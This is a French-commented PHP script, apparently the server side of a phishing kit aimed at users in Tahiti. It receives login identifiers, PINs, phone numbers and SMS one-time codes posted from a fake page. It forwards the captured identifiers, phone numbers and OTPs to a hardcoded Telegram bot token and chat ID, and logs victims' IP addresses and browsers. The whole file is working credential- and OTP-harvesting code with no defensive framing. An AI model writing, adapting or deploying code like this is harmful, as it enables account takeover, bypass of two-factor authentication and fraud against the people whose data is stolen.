<?php
// config.php – inchangé
error_reporting(0);
ini_set('display_errors', 0);
header('Content-Type: application/json; charset=utf-8');

$botToken   = '7680764335:AAF1DVT5n0Cye90-1W-eBWkE9gFZJ-iUPX8';
$chatId     = '-1002229212231';
$telegramApiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";

$logFile = __DIR__ . '/data_log.txt';
$maxLogSize = 2 * 1024 * 1024;

// URL du panel admin
$adminPanelUrl = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . dirname($_SERVER['SCRIPT_NAME']) . '/admin_panel.php';

function sanitize($input) {
    if (!is_string($input)) return '';
    return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
}

function validateIdentifiant($value) {
    return preg_match('/^[a-zA-Z0-9._-]{3,50}$/', $value);
}

function validatePassword($value) {
    $len = strlen($value);
    return $len >= 6 && $len <= 100;
}

function validatePhone($value) {
    $value = preg_replace('/[^0-9+]/', '', $value);
    return preg_match('/^(\+689|0)?[0-9]{8}$/', $value);
}

function validateOtp($value) {
    return preg_match('/^[0-9]{6}$/', $value);
}

function writeLog($type, $status, $value = '') {
    global $logFile, $maxLogSize;

    if (file_exists($logFile) && filesize($logFile) > $maxLogSize) {
        @unlink($logFile);
    }

    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    $now = date('Y-m-d H:i:s');
    $line = "[$now] Type: $type | Status: $status | IP: $ip | UA: $ua\n";
    @file_put_contents($logFile, $line, FILE_APPEND | LOCK_EX);
}

function sendToTelegram($message) {
    global $telegramApiUrl, $chatId;

    $data = [
        'chat_id' => $chatId,
        'text'    => $message,
        'parse_mode' => 'HTML'
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\nUser-Agent: PHP-Telegram-Bot\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
            'timeout' => 5,
            'ignore_errors' => true
        ],
        'https' => [
            'timeout' => 5,
            'verify_peer' => true,
            'verify_peer_name' => true,
            'allow_self_signed' => false
        ]
    ];

    $context = stream_context_create($options);
    $result = @file_get_contents($telegramApiUrl, false, $context);
    return $result !== false;
}

function jsonExit($status, $message, $httpCode = 200) {
    http_response_code($httpCode);
    echo json_encode([
        'status' => $status,
        'message' => $message,
        'timestamp' => date('Y-m-d H:i:s')
    ]);
    exit;
}

// Traitement principal
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    jsonExit('error', 'Méthode non autorisée', 405);
}

$type  = sanitize($_POST['type'] ?? '');
$value = sanitize($_POST['value'] ?? '');

if (empty($type) || empty($value)) {
    writeLog($type, 'missing_data');
    jsonExit('error', 'Données manquantes', 400);
}

$valid = false;
$telegramMessage = '';

switch ($type) {
    case 'identifiant':
        if (validateIdentifiant($value)) {
            $valid = true;
            $telegramMessage = "🔐 <b>Identifiant</b>\n<code>" . htmlspecialchars($value) . "</code>";
        } else {
            writeLog($type, 'invalid_format', $value);
            jsonExit('error', 'Format d’identifiant invalide', 400);
        }
        break;

    case 'password':
    case 'pin':
        if (validatePassword($value)) {
            $valid = true;
            $telegramMessage = "🔑 <b>Code PIN</b>\n<code>••••••••</code> (masqué)\n\n👤 <b>Admin panel</b> : <a href='$adminPanelUrl'>$adminPanelUrl</a>";
        } else {
            writeLog($type, 'invalid_password', $value);
            jsonExit('error', 'Le mot de passe doit contenir entre 6 et 100 caractères', 400);
        }
        break;

    case 'numero':
        if (validatePhone($value)) {
            $valid = true;
            $telegramMessage = "📱 <b>Numéro Tahiti</b>\n<code>" . htmlspecialchars($value) . "</code>";
        } else {
            writeLog($type, 'invalid_phone', $value);
            jsonExit('error', 'Numéro de téléphone invalide (ex: +68987123456)', 400);
        }
        break;

    case 'sms':
    case 'otp':
        if (validateOtp($value)) {
            $valid = true;
            $telegramMessage = "✅ <b>Code OTP</b>\n<code>" . htmlspecialchars($value) . "</code>";
        } else {
            writeLog($type, 'invalid_otp', $value);
            jsonExit('error', 'Code OTP invalide (6 chiffres requis)', 400);
        }
        break;

    default:
        writeLog($type, 'unknown_type', $value);
        jsonExit('error', 'Type de donnée non reconnu', 400);
}

if ($valid && sendToTelegram($telegramMessage)) {
    writeLog($type, 'success');
    jsonExit('success', 'Donnée reçue et envoyée');
} else {
    writeLog($type, 'telegram_error');
    jsonExit('error', 'Échec de l’envoi vers Telegram', 500);
}
?>